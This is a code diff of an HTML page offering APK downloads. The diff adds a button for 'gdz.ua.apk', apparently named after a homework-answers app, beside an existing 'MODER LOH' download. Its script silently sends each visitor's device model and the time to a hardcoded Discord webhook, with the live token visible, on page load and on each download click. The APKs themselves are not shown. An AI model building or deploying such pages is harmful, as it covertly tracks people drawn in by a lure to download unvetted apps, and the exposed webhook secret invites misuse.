@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MODER LOH</title>
+    <title>GDZ & MODER LOH</title>
     <style>
         body {
             margin: 0;
@@ -12,15 +12,21 @@
             font-family: sans-serif;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            height: 100vh;
+            justify-content: flex-start;
+            min-height: 100vh;
+            padding: 40px 20px;
             text-align: center;
+            box-sizing: border-box;
+        }
+        .section {
+            margin-bottom: 60px;
         }
         h1 {
             font-size: 40px;
             color: #ff0000;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
         }
         .btn {
             display: inline-block;
@@ -39,54 +45,41 @@
 </head>
 <body>
 
-    <h1>MODER LOH</h1>
-    <a href="app-debug.apk" download id="downloadBtn" class="btn">DOWNLOAD APK</a>
+    <div class="section">
+        <h1>GDZ</h1>
+        <a href="gdz.ua.apk" download id="gdzBtn" class="btn">DOWNLOAD APK</a>
+    </div>
+
+    <div class="section">
+        <h1>MODER LOH</h1>
+        <a href="app-debug.apk" download id="moderBtn" class="btn">DOWNLOAD APK</a>
+    </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
 
-        // Асинхронна функція для пробиття "Android K"
         async function getDevice() {
-            // 1. Спроба витягнути приховану модель через новий API (працює тільки на HTTPS)
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
                     const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
-                    if (hints.model) {
-                        return `Android (${hints.model})`;
-                    }
-                } catch (e) {
-                    console.error("Браузер не віддав модель", e);
-                }
+                    if (hints.model) return `Android (${hints.model})`;
+                } catch (e) {}
             }
-
-            // 2. Якщо це старий браузер, iPhone, або сайт без HTTPS — пробуємо по-старому
             const ua = navigator.userAgent;
             if (/android/i.test(ua)) {
                 const match = ua.match(/Android\s+([^\s;]+);?\s?([^;)]+)?/);
-                let fallbackModel = match ? (match[2] || match[1]) : "Unknown";
-                // Якщо браузер видав заглушку "K", так і напишемо
-                return fallbackModel === 'K' ? "Android (Модель прихована браузером)" : `Android (${fallbackModel})`;
-            } else if (/iPhone/i.test(ua)) {
-                return "iPhone";
-            } else {
-                return "PC / Other";
+                let fallback = match ? (match[2] || match[1]) : "Unknown";
+                return fallback === 'K' ? "Android (Модель прихована)" : `Android (${fallback})`;
             }
+            return /iPhone/i.test(ua) ? "iPhone" : "PC / Other";
         }
 
         function getTime() {
-            const now = new Date();
-            return now.toLocaleString('uk-UA', { 
-                day: '2-digit', 
-                month: '2-digit', 
-                year: 'numeric', 
-                hour: '2-digit', 
-                minute: '2-digit', 
-                second: '2-digit' 
-            }).replace(',', '');
+            return new Date().toLocaleString('uk-UA').replace(',', '');
         }
 
         async function sendLog(statusText, emoji) {
-            const deviceName = await getDevice(); // Чекаємо, поки браузер віддасть модель
+            const deviceName = await getDevice();
             const message = `${emoji} **${statusText}**\n\n` +
                             `📱 **Пристрій:** ${deviceName}\n` +
                             `⏰ **Час:** ${getTime()}`;
@@ -98,16 +91,17 @@
             });
         }
 
-        // Подія: зайшов на сайт
-        window.onload = () => {
-            sendLog("Хтось перейшов по посиланню!", "👤");
-        };
+        window.onload = () => sendLog("Хтось перейшов по посиланню!", "👤");
 
-        // Подія: натиснув скачати
-        document.getElementById('downloadBtn').addEventListener('click', () => {
-            sendLog("Почав скачувати файл!", "📥");
+        // Сповіщення для GDZ
+        document.getElementById('gdzBtn').addEventListener('click', () => {
+            sendLog("Почав скачувати файл GDZ (gdz.ua.apk)!", "📥");
+        });
+
+        // Сповіщення для MODER LOH
+        document.getElementById('moderBtn').addEventListener('click', () => {
+            sendLog("Почав скачувати файл MODER LOH!", "📥");
         });
     </script>
-
 </body>
 </html>
